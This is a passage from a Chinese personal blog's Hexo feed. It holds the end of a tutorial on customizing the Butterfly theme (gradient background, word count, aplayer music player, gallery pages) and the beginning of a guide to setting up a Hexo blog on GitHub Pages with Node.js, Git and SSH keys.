href="#自定义背景主题色" class="headerlink" title="自定义背景主题色"></a>自定义背景主题色</h2><p>可以修改部分的UI颜色，没测试过</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># theme_color:</span><br><span class="line">#   enable: <span class="literal">true</span></span><br><span class="line">#   main: <span class="string">&quot;#49B1F5&quot;</span></span><br><span class="line">#   paginator: <span class="string">&quot;#00c4b6&quot;</span></span><br><span class="line">#   button_hover: <span class="string">&quot;#FF7242&quot;</span></span><br><span class="line">#   text_selection: <span class="string">&quot;#00c4b6&quot;</span></span><br><span class="line">#   link_color: <span class="string">&quot;#99a9bf&quot;</span></span><br><span class="line">#   meta_color: <span class="string">&quot;#858585&quot;</span></span><br><span class="line">#   hr_color: <span class="string">&quot;#A4D8FA&quot;</span></span><br><span class="line">#   code_foreground: <span class="string">&quot;#F47466&quot;</span></span><br><span class="line">#   code_background: <span class="string">&quot;rgba(27, 31, 35, .05)&quot;</span></span><br><span class="line">#   toc_color: <span class="string">&quot;#00c4b6&quot;</span></span><br><span class="line">#   blockquote_padding_color: <span class="string">&quot;#49b1f5&quot;</span></span><br><span class="line">#   blockquote_background_color: <span class="string">&quot;#49b1f5&quot;</span></span><br></pre></td></tr></table></figure><h2 id="渐变背景"><a href="#渐变背景" class="headerlink" title="渐变背景"></a>渐变背景</h2><p>默认显示白色，可设置图片或者颜色<br>修改主题配置文件_config.butterfly.yml：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">background:</span><br></pre></td></tr></table></figure><p>设置渐变色步骤：</p><ol><li>在\Butterfly\source\css\目录下创建css文件 background.css：</li></ol><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#web_bg &#123;</span><br><span class="line">  background: -webkit-linear-gradient(</span><br><span class="line">    0deg,</span><br><span class="line">    rgba(<span class="number">247</span>, <span class="number">149</span>, <span class="number">51</span>, <span class="number">0.1</span>) <span class="number">0</span>,</span><br><span class="line">    rgba(<span class="number">243</span>, <span class="number">112</span>, <span class="number">85</span>, <span class="number">0.1</span>) <span class="number">15</span>%,</span><br><span class="line">    rgba(<span class="number">239</span>, <span class="number">78</span>, <span class="number">123</span>, <span class="number">0.1</span>) <span class="number">30</span>%,</span><br><span class="line">    rgba(<span class="number">161</span>, <span class="number">102</span>, <span class="number">171</span>, <span class="number">0.1</span>) <span class="number">44</span>%,</span><br><span class="line">    rgba(<span class="number">80</span>, <span class="number">115</span>, <span class="number">184</span>, <span class="number">0.1</span>) <span class="number">58</span>%,</span><br><span class="line">    rgba(<span class="number">16</span>, <span class="number">152</span>, <span class="number">173</span>, <span class="number">0.1</span>) <span class="number">72</span>%,</span><br><span class="line">    rgba(<span class="number">7</span>, <span class="number">179</span>, <span class="number">155</span>, <span class="number">0.1</span>) <span class="number">86</span>%,</span><br><span class="line">    rgba(<span class="number">109</span>, <span class="number">186</span>, <span class="number">130</span>, <span class="number">0.1</span>) <span class="number">100</span>%</span><br><span class="line">  );</span><br><span class="line">  background: -moz-linear-gradient(</span><br><span class="line">    0deg,</span><br><span class="line">    rgba(<span class="number">247</span>, <span class="number">149</span>, <span class="number">51</span>, <span class="number">0.1</span>) <span class="number">0</span>,</span><br><span class="line">    rgba(<span class="number">243</span>, <span class="number">112</span>, <span class="number">85</span>, <span class="number">0.1</span>) <span class="number">15</span>%,</span><br><span class="line">    rgba(<span class="number">239</span>, <span class="number">78</span>, <span class="number">123</span>, <span class="number">0.1</span>) <span class="number">30</span>%,</span><br><span class="line">    rgba(<span class="number">161</span>, <span class="number">102</span>, <span class="number">171</span>, <span class="number">0.1</span>) <span class="number">44</span>%,</span><br><span class="line">    rgba(<span class="number">80</span>, <span class="number">115</span>, <span class="number">184</span>, <span class="number">0.1</span>) <span class="number">58</span>%,</span><br><span class="line">    rgba(<span class="number">16</span>, <span class="number">152</span>, <span class="number">173</span>, <span class="number">0.1</span>) <span class="number">72</span>%,</span><br><span class="line">    rgba(<span class="number">7</span>, <span class="number">179</span>, <span class="number">155</span>, <span class="number">0.1</span>) <span class="number">86</span>%,</span><br><span class="line">    rgba(<span class="number">109</span>, <span class="number">186</span>, <span class="number">130</span>, <span class="number">0.1</span>) <span class="number">100</span>%</span><br><span class="line">  );</span><br><span class="line">  background: -o-linear-gradient(</span><br><span class="line">    0deg,</span><br><span class="line">    rgba(<span class="number">247</span>, <span class="number">149</span>, <span class="number">51</span>, <span class="number">0.1</span>) <span class="number">0</span>,</span><br><span class="line">    rgba(<span class="number">243</span>, <span class="number">112</span>, <span class="number">85</span>, <span class="number">0.1</span>) <span class="number">15</span>%,</span><br><span class="line">    rgba(<span class="number">239</span>, <span class="number">78</span>, <span class="number">123</span>, <span class="number">0.1</span>) <span class="number">30</span>%,</span><br><span class="line">    rgba(<span class="number">161</span>, <span class="number">102</span>, <span class="number">171</span>, <span class="number">0.1</span>) <span class="number">44</span>%,</span><br><span class="line">    rgba(<span class="number">80</span>, <span class="number">115</span>, <span class="number">184</span>, <span class="number">0.1</span>) <span class="number">58</span>%,</span><br><span class="line">    rgba(<span class="number">16</span>, <span class="number">152</span>, <span class="number">173</span>, <span class="number">0.1</span>) <span class="number">72</span>%,</span><br><span class="line">    rgba(<span class="number">7</span>, <span class="number">179</span>, <span class="number">155</span>, <span class="number">0.1</span>) <span class="number">86</span>%,</span><br><span class="line">    rgba(<span class="number">109</span>, <span class="number">186</span>, <span class="number">130</span>, <span class="number">0.1</span>) <span class="number">100</span>%</span><br><span class="line">  );</span><br><span class="line">  background: -ms-linear-gradient(</span><br><span class="line">    0deg,</span><br><span class="line">    rgba(<span class="number">247</span>, <span class="number">149</span>, <span class="number">51</span>, <span class="number">0.1</span>) <span class="number">0</span>,</span><br><span class="line">    rgba(<span class="number">243</span>, <span class="number">112</span>, <span class="number">85</span>, <span class="number">0.1</span>) <span class="number">15</span>%,</span><br><span class="line">    rgba(<span class="number">239</span>, <span class="number">78</span>, <span class="number">123</span>, <span class="number">0.1</span>) <span class="number">30</span>%,</span><br><span class="line">    rgba(<span class="number">161</span>, <span class="number">102</span>, <span class="number">171</span>, <span class="number">0.1</span>) <span class="number">44</span>%,</span><br><span class="line">    rgba(<span class="number">80</span>, <span class="number">115</span>, <span class="number">184</span>, <span class="number">0.1</span>) <span class="number">58</span>%,</span><br><span class="line">    rgba(<span class="number">16</span>, <span class="number">152</span>, <span class="number">173</span>, <span class="number">0.1</span>) <span class="number">72</span>%,</span><br><span class="line">    rgba(<span class="number">7</span>, <span class="number">179</span>, <span class="number">155</span>, <span class="number">0.1</span>) <span class="number">86</span>%,</span><br><span class="line">    rgba(<span class="number">109</span>, <span class="number">186</span>, <span class="number">130</span>, <span class="number">0.1</span>) <span class="number">100</span>%</span><br><span class="line">  );</span><br><span class="line">  background: linear-gradient(</span><br><span class="line">    90deg,</span><br><span class="line">    rgba(<span class="number">247</span>, <span class="number">149</span>, <span class="number">51</span>, <span class="number">0.1</span>) <span class="number">0</span>,</span><br><span class="line">    rgba(<span class="number">243</span>, <span class="number">112</span>, <span class="number">85</span>, <span class="number">0.1</span>) <span class="number">15</span>%,</span><br><span class="line">    rgba(<span class="number">239</span>, <span class="number">78</span>, <span class="number">123</span>, <span class="number">0.1</span>) <span class="number">30</span>%,</span><br><span class="line">    rgba(<span class="number">161</span>, <span class="number">102</span>, <span class="number">171</span>, <span class="number">0.1</span>) <span class="number">44</span>%,</span><br><span class="line">    rgba(<span class="number">80</span>, <span class="number">115</span>, <span class="number">184</span>, <span class="number">0.1</span>) <span class="number">58</span>%,</span><br><span class="line">    rgba(<span class="number">16</span>, <span class="number">152</span>, <span class="number">173</span>, <span class="number">0.1</span>) <span class="number">72</span>%,</span><br><span class="line">    rgba(<span class="number">7</span>, <span class="number">179</span>, <span class="number">155</span>, <span class="number">0.1</span>) <span class="number">86</span>%,</span><br><span class="line">    rgba(<span class="number">109</span>, <span class="number">186</span>, <span class="number">130</span>, <span class="number">0.1</span>) <span class="number">100</span>%</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改配置文件_config.butterfly.yml的引入方式</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># Inject</span><br><span class="line"># 插入代码到头部 &lt;/head&gt; 之前 和 底部 &lt;/body&gt; 之前</span><br><span class="line">inject:</span><br><span class="line">  head:</span><br><span class="line">     - &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;/css/background.css&quot;</span>&gt;</span><br><span class="line">  bottom:</span><br><span class="line">    # - &lt;script src=<span class="string">&quot;xxxx&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>如果背景色不生效，设置_config.butterfly.yml</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># Website <span class="title function_">Background</span> <span class="params">(設置網站背景)</span></span><br><span class="line"># can set it to color or <span class="title function_">image</span> <span class="params">(可設置圖片 或者 顔色)</span></span><br><span class="line"># The formal of image: url(http:<span class="comment">//xxxxxx.com/xxx.jpg)</span></span><br><span class="line">background: <span class="string">&#x27;#efefef&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091740434.png" alt="image-20240409174058336">  </p><h1 id="footer背景"><a href="#footer背景" class="headerlink" title="footer背景"></a>footer背景</h1><p>footer 的背景，当设置 false 时，将与主题色一致。修改主题配置文件_config.butterfly.yml</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># footer是否显示图片背景(与top_img一致)</span><br><span class="line">footer_bg: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091741053.png" alt="image-20240409174152727"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091742215.png" alt="image-20240409174205076">  </p><h1 id="字数统计"><a href="#字数统计" class="headerlink" title="字数统计"></a>字数统计</h1><p>安装统计组件</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">npm install hexo-wordcount --save or yarn add hexo-wordcount</span><br></pre></td></tr></table></figure><p>修改主题配置文件_config.butterfly.yml</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># wordcount (字數統計)</span><br><span class="line">wordcount:</span><br><span class="line">  enable: <span class="literal">true</span></span><br><span class="line">  post_wordcount: <span class="literal">true</span></span><br><span class="line">  min2read: <span class="literal">true</span></span><br><span class="line">  total_wordcount: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091742197.png" alt="image-20240409174215114">  </p><h1 id="添加音乐播放器"><a href="#添加音乐播放器" class="headerlink" title="添加音乐播放器"></a>添加音乐播放器</h1><h2 id="插件安装与配置"><a href="#插件安装与配置" class="headerlink" title="插件安装与配置"></a>插件安装与配置</h2><p>安装 <a href="https://github.com/MoePlayer/hexo-tag-aplayer">hexo-tag-aplayer</a> 这款插件。执行如下指令：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">npm install --save hexo-tag-aplayer</span><br></pre></td></tr></table></figure><p>插件配置方式为修改Hexo 的配置文件中进行如下修改。就是你的<a href="https://so.csdn.net/so/search?q=Hexo&spm=1001.2101.3001.7020">Hexo</a>根目录下的_config.yml文件。</p><p>这块直接搜，没有在Hexo目录下的_config.yml文件中找到，将如下内容添加：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">aplayer:</span><br><span class="line">  meting: <span class="literal">true</span></span><br><span class="line">  asset_inject: <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>主题配置文件_config.butterfly.yml中开启aplayerInject：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># Inject the css and <span class="title function_">script</span> <span class="params">(aplayer/meting)</span></span><br><span class="line">aplayerInject:</span><br><span class="line">  enable: <span class="literal">true</span></span><br><span class="line">  per_page: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>下面介绍两种常见的用法：</p><h2 id="普通页面播放器"><a href="#普通页面播放器" class="headerlink" title="普通页面播放器"></a>普通页面播放器</h2><p>在博客音乐播放页面（&#x2F;source&#x2F;music&#x2F;index.md）中添加如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;% meting <span class="string">&quot;8872308188&quot;</span> <span class="string">&quot;netease&quot;</span> <span class="string">&quot;playlist&quot;</span> <span class="string">&quot;autoplay&quot;</span> <span class="string">&quot;mutex:false&quot;</span> <span class="string">&quot;listmaxheight:400px&quot;</span> <span class="string">&quot;preload:none&quot;</span> <span class="string">&quot;theme:#ad7a86&quot;</span>%&#125;</span><br></pre></td></tr></table></figure><p>常用的选项如下所示:</p><p><strong>server可选</strong>：netease（网易云音乐），tencent（QQ音乐），kugou（酷狗音乐），xiami（虾米音乐），baidu（百度音乐）。建议网易云</p><p><strong>type可选</strong>：song（歌曲），playlist（歌单），album（专辑），search（搜索关键字），artist（歌手）。添加单曲选的歌曲，歌单选择playlist，可以自行尝试。</p><p><strong>id获取示例</strong>: 打开网易云音乐，选择喜欢的歌单，在网页版打开，获取歌单list，填入即可。使用的时候将上边的ID号换为自己喜欢的歌单即可。注意歌单中不能包括VIP音乐，否则无法解析。建议单独建立一个歌单，以后有喜欢的音乐添加进去，网页也会自动同步添加。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091742965.png" alt="image-20240409174227907">  </p><p>lrcType设置为 -1默认显示歌词，放在fixed模式下比较合适。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091743652.png" alt="image-20240409174302343">  </p><h2 id="全局吸底Aplayer模式"><a href="#全局吸底Aplayer模式" class="headerlink" title="全局吸底Aplayer模式"></a>全局吸底Aplayer模式</h2><p>把 aplayer代码 插入到主题配置文件_config.butterfly.yml的 inject.bottom 即可。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">inject:</span><br><span class="line">  head:</span><br><span class="line">  bottom:</span><br><span class="line">    - &lt;div class=<span class="string">&quot;aplayer no-destroy&quot;</span> data-id=<span class="string">&quot;7422861869&quot;</span> data-server=<span class="string">&quot;netease&quot;</span> data-type=<span class="string">&quot;playlist&quot;</span> data-fixed=<span class="string">&quot;true&quot;</span> data-autoplay=<span class="string">&quot;true&quot;</span> data-lrcType=<span class="string">&quot;-1&quot;</span>&gt; &lt;/div&gt;</span><br></pre></td></tr></table></figure><p>需要修改的参数就只有data-id、data-server、data-type、data-autoplay&#x3D;”true”、data-lrcType&#x3D;”-1”一些常用的参数，可以自行根据需要修改。</p><p>最后，如果你想切换页面时，音乐不会中断。请把主题配置文件的 pjax 设为 true即可。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">pjax:</span><br><span class="line"> enable: ture</span><br><span class="line"> exclude:</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091743658.png" alt="image-20240409174316617"> </p><h1 id="创建主题图库"><a href="#创建主题图库" class="headerlink" title="创建主题图库"></a>创建主题图库</h1><p>执行如下命令，创建photos页面</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">hexo n page photos     #创建你的页面   </span><br></pre></td></tr></table></figure><p>在index.md文件的 Front-matter 中添加如下内容（不现实侧边栏和评论区）</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091743503.png" alt="image-20240409174322454"> </p><p>添加图库集合页</p><p>图库集合页面就是普通的页面，比如上面创建的&#x2F;photos&#x2F;index.md页面，下面将其设置成一个图库集合页面！设置图库集合页面是使用外挂标签来实现的，书写格式如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;div class=<span class="string">&quot;gallery-group-main&quot;</span>&gt;</span><br><span class="line">&#123;% galleryGroup name description link img-url %&#125;</span><br><span class="line">&#123;% galleryGroup name description link img-url %&#125;</span><br><span class="line">&#123;% galleryGroup name description link img-url %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>这里面每个galleryGroup中设置的内容如下：</p><ul><li>name：图库名字</li><li>description：图库描述</li><li>link：链接到对应相册地址</li><li>img-url：图库封面地址</li></ul><p>如下所示：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;div class=<span class="string">&quot;gallery-group-main&quot;</span>&gt;</span><br><span class="line">&#123;% galleryGroup <span class="string">&#x27;壁紙&#x27;</span> <span class="string">&#x27;收藏的一些壁纸，侵删&#x27;</span> <span class="string">&#x27;/album/wallpaper&#x27;</span> https:<span class="comment">//www.czblogs.cn/album/wallpaper.jpeg %&#125;</span></span><br><span class="line">&#123;% galleryGroup <span class="string">&#x27;风景&#x27;</span> <span class="string">&#x27;相册是我快乐过的证据&#x27;</span> <span class="string">&#x27;/album/life&#x27;</span> https:<span class="comment">//www.czblogs.cn/album/life.jpeg %&#125;</span></span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>这样设置后，页面就变成了这样</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091743457.png" alt="image-20240409174346000">  </p><p>图库子页面</p><p>此时，点击任何一个图集，都会重定向到 404 页！这是因为我们还没有创建相应的子页面！这里我以《生活》这个相册为例来创建它的子页面！</p><p>第一步：打开终端，切换到本地 Hexo 博客的根目录下，执行如下命令</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">hexo <span class="keyword">new</span> <span class="title class_">page</span> life</span><br></pre></td></tr></table></figure><p>然后会在博客根目录下的&#x2F;source目录下生成名为life的文件夹，并在其中生成一个名为index.md的文件，这个文件就对应着《生活》这个子页面！</p><p>但是此时图库子页面&#x2F;source&#x2F;life&#x2F;index.md跟相册首页&#x2F;source&#x2F;photos&#x2F;index.md是平级的：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091744958.png" alt="image-20240409174400897">  </p><p>第二步：将life整个文件夹都移动到album文件夹中：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091744854.png" alt="image-20240409174408799">  </p><p>第三步：此时打开&#x2F;source&#x2F;photos&#x2F;life&#x2F;index.md文件，修改如下：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091744316.png" alt="image-20240409174417267">  </p><p>第四步：然后在子页面（也就是&#x2F;source&#x2F;photos&#x2F;life&#x2F;index.md）中使用标签外挂挂上自己的照片，写法如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;% gallery %&#125;</span><br><span class="line">![]()</span><br><span class="line">&#123;% endgallery %&#125;</span><br></pre></td></tr></table></figure><p>比如我下面这样，填写很多个自己的图片（图片路径需要自己填充）：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;% gallery %&#125;</span><br><span class="line">![](https:<span class="comment">//w.wallhaven.cc/full/72/wallhaven-72yzje.jpg)</span></span><br><span class="line">![](https:<span class="comment">//w.wallhaven.cc/full/l8/wallhaven-l8v3ey.png)</span></span><br><span class="line">![](https:<span class="comment">//w.wallhaven.cc/full/1p/wallhaven-1poo61.jpg)</span></span><br><span class="line">![](https:<span class="comment">//w.wallhaven.cc/full/kx/wallhaven-kxj3l1.jpg)</span></span><br><span class="line">![](https:<span class="comment">//w.wallhaven.cc/full/jx/wallhaven-jxl31y.png)</span></span><br><span class="line">&#123;% endgallery %&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091744405.png" alt="image-20240409174443067">   </p><h1 id="留言板"><a href="#留言板" class="headerlink" title="留言板"></a>留言板</h1><p>具体实现可参考：<a href="https://fe32.top/articles/hexo1611/">https://fe32.top/articles/hexo1611/</a></p>]]></content>
      
      
      <categories>
          
          <category> 博客搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> blog </tag>
            
            <tag> 主题 </tag>
            
            <tag> butterfly </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从0到-1搭建个人博客</title>
      <link href="/2024/03/19/%E4%BB%8E0%E5%88%B0-1%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
      <url>/2024/03/19/%E4%BB%8E0%E5%88%B0-1%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>使用Hexo和GitHub搭建博客的原理主要涉及静态网站生成与托管两个核心环节：</p><p>首先，Hexo是一个基于Node.js的静态博客框架。它的工作原理是解析使用Markdown（或其他渲染引擎）编写的文章，并利用主题模板生成静态网页。这意味着，当使用Hexo创建博客时，其实是在本地编写和预览博客的内容。Hexo的优势在于其快速、简洁且高效，使创作者无需关注太多技术细节。</p><p>然后，生成的静态网页需要托管到网络上以供他人访问。GitHub Pages是一个很好的选择，它是一个允许用户在其GitHub仓库上托管静态网页的服务。通过将Hexo生成的静态网页推送到GitHub仓库，并利用GitHub Pages的设置功能，就可以将博客发布到互联网上。</p><p>因此，使用Hexo+GitHub搭建博客的原理就是：利用Hexo生成静态网页，然后将这些网页托管到GitHub Pages上，从而实现博客的在线发布和访问。</p><p>具体来说，搭建过程主要包括以下几个步骤：</p><ol><li>安装Git和Node.js，这是使用Hexo和GitHub的前提。</li><li>安装Hexo，并初始化博客项目。</li><li>在GitHub上创建个人仓库，用于存放博客的源代码和静态网页。</li><li>将Hexo生成的静态网页推送到GitHub仓库。</li><li>在GitHub仓库中设置GitHub Pages，选择正确的分支和目录，以便正确托管静态网页。</li><li>更改Hexo的主题，以定制博客外观。</li><li>设置个人域名（可选），以便使用自定义域名访问博客。</li><li>开始使用Hexo编写和发布文章，每次发布新文章时，只需运行Hexo的生成命令，然后将生成的静态网页推送到GitHub即可。</li></ol><h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><h2 id="注册github账号"><a href="#注册github账号" class="headerlink" title="注册github账号"></a>注册github账号</h2><p>前往github官网进行账号注册。（若已有账号，此步骤可忽略）</p><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">https://www.github.com/    </span><br></pre></td></tr></table></figure><p>注册之后，要记住邮箱和用户名，这块在后面会用到。</p><h2 id="安装NodeJS"><a href="#安装NodeJS" class="headerlink" title="安装NodeJS"></a>安装NodeJS</h2><p>Hexo是基于NodeJS的静态框架博客，所以，如果要安装Hexo，前提条件是要有NodeJS的环境。<br>进入NodeJS官网，下载对应的版本。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091709927.png" alt="image-20240409170903874">  </p><p>如果是windows，安装的时候建议无脑下一步就行，如果 C 盘不吃紧的话，然后勾选所有组件，并勾选 Add to Path 将其添加到系统环境变量。</p><p>如果是Linux，可以参考这篇文章：</p><p><a href="https://blog.csdn.net/qq_41974199/article/details/119328353">https://blog.csdn.net/qq_41974199/article/details/119328353</a></p><p>安装Node.js 会包含环境变量以及 npm 的安装，安装后，可以在命令行输入如下命令检测是否安装成功：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">node -v   //显示 nodejs 的版本号。</span><br><span class="line">npm -v    //显示 npm 的版本号</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091709361.png" alt="image-20240409170920334">  </p><p>【注】这块推荐使用14以上的nodeJS版本，之前用的v10的版本，会报错。</p><h2 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h2><p><a href="https://git-scm.com/">https://git-scm.com/</a></p><p>若为windows，需要安装Git bash，所有安装建议都无脑下一步即可。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091709228.png" alt="image-20240409170930145">  </p><p>若为Linux，直接命令行在线安装即可。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install -y git</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091709444.png" alt="image-20240409170945400">  </p><h2 id="设置用户名和邮箱"><a href="#设置用户名和邮箱" class="headerlink" title="设置用户名和邮箱"></a>设置用户名和邮箱</h2><p>因为 Git 是分布式版本控制系统，所以需要设置用户名和邮箱作为一个标识，在命令行输入如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;user_name&quot;</span> <span class="comment"># user_name 填入 GitHub 用户名</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global user.email <span class="string">&quot;user_email&quot;</span> <span class="comment"># user_email 填入 GitHub 注册的邮箱</span></span><br></pre></td></tr></table></figure><p>此处全局设置用户名和邮箱后，将作为本地和github同步的 **[UserName]**。</p><h2 id="搭建github仓库"><a href="#搭建github仓库" class="headerlink" title="搭建github仓库"></a>搭建github仓库</h2><h3 id="新建仓库"><a href="#新建仓库" class="headerlink" title="新建仓库"></a>新建仓库</h3><p>登录github官网后，点击 “New repository”，创建一个名字为username.github.io（这里的 username 要替换成自己的实际的用户名） 的仓库。</p><p>比如，之前设置的用户名为 “muhe”，则这块创建的仓库名字为 muhe.github.io</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091709357.png" alt="image-20240409170957327">  </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091710821.png" alt="image-20240409171006790">  </p><h3 id="配置SSH-Key"><a href="#配置SSH-Key" class="headerlink" title="配置SSH Key"></a>配置SSH Key</h3><p>使用git，输入如下命令，生成一对公私钥</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -C <span class="string">&quot;user.email&quot;</span> # user.email 为GitHub 上注册的邮箱</span><br></pre></td></tr></table></figure><p>然后直接三个回车即可，默认不需要设置密码。查看是否已经有 ssh 密钥。打开用户目录 &#x2F;root&#x2F;.ssh</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091710435.png" alt="image-20240409171016406"> </p><p>然后找到生成的 .ssh 的文件夹中的 id_rsa.pub 密钥，将内容全部复制。</p><p>其中 id_rsa 是私钥不能泄露，id_rsa.pub 是公钥可以放心告诉他人。</p><p>打开<a href="https://github.com/settings/ssh/new">GitHub SSH and GPG keys</a> 页面，新建一个 ssh key：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091710250.png" alt="image-20240409171031214">  </p><p>Title 为标题，任意填即可，将刚刚复制的 id_rsa.pub 内容粘贴进去，最后点击 Add SSH key。在 Git Bash 中检测 GitHub 公钥设置是否成功，输入如下命令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><p>验证是否可以连接成功，若连接成功的话，显示如下：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091710942.png" alt="image-20240409171040917">  </p><p>这一步骤，相当于生成了本地和github仓库的 <strong>[Password]</strong></p><h1 id="使用Hexo博客框架"><a href="#使用Hexo博客框架" class="headerlink" title="使用Hexo博客框架"></a>使用Hexo博客框架</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Hexo 是一个简单、快速、强大的基于 Github Pages 的博客框架，支持 Markdown 格式。</p><p>集成了众多优秀插件和主题。</p><p>由于 Github Pages 存放的都是静态文件，博客存放的不只是文章内容，还有文章列表、分类、标签、翻页等动态内容，假如每次写完一篇文章都要手动更新博文目录和相关链接信息，相信谁都会疯掉，所以 Hexo 所做的就是将这些 md 文件都放在本地，每次写完文章后调用写好的命令来批量完成相关页面的生成，然后再将有改动的页面提交到 GitHub 。</p><h2 id="安装与初始化"><a href="#安装与初始化" class="headerlink" title="安装与初始化"></a>安装与初始化</h2><p>输入如下命令进行安装：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$ npm install -g hexo-cli # 此命令完成对 hexo 的安装</span><br></pre></td></tr></table></figure><p>安装完成后，在电脑的某个地方新建一个文件夹（名字可以随便取）专门用于存放博客代码，比如我的是 &#x2F;root&#x2F;blog，由于这个文件夹将来存放博客的所有内容和素材，以及所有的博客操作都会在其中完成，所以最好不要随便放。</p><p>进入上面新建的目录，输入如下命令进行初始化</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$ hexo init # 该命令完成 hexo 在本地博客目录的初始化</span><br></pre></td></tr></table></figure><h2 id="生成静态文件"><a href="#生成静态文件" class="headerlink" title="生成静态文件"></a>生成静态文件</h2><p>输入如下命令，生成所需的静态文件：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$ hexo g # 生成静态文件</span><br></pre></td></tr></table></figure><p>执行以上命令后，Hexo 就会在 public 文件夹中生成相关的 html 文件，这些文件将来都是要提交到 GitHub 上的 username.github.io 的仓库中去的。</p><h2 id="本地预览"><a href="#本地预览" class="headerlink" title="本地预览"></a>本地预览</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$ hexo s # 开启本地预览</span><br></pre></td></tr></table></figure><p>hexo s 是开启本地预览服务，打开浏览器访问 <a href="http://localhost:4000/">http://localhost:4000</a> 即可看到内容，Ctrl+C 停止本地预览。本地预览可以实时查看博客的编辑情况，待博客写完后一起部署到 GitHub 上。</p><p>第一次初始化的时候 hexo 已经帮我们写了一篇名为 Hello World 的文章，默认的主题比较丑。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091710615.png" alt="image-20240409171052488">  </p><h1 id="上传到GitHub"><a href="#上传到GitHub" class="headerlink" title="上传到GitHub"></a>上传到GitHub</h1><h2 id="设置站点配置文件"><a href="#设置站点配置文件" class="headerlink" title="设置站点配置文件"></a>设置站点配置文件</h2><p>hexo 有 2 种 _config.yml 文件，一个是根目录下的全局的 _config.yml，一个是各个主体 theme 下的 _config.yml。将前者称为站点配置文件， 后者称为主题配置文件。</p><p>打开根目录下站点配置文件 _config.yml，配置有关 deploy 的部分：</p><figure 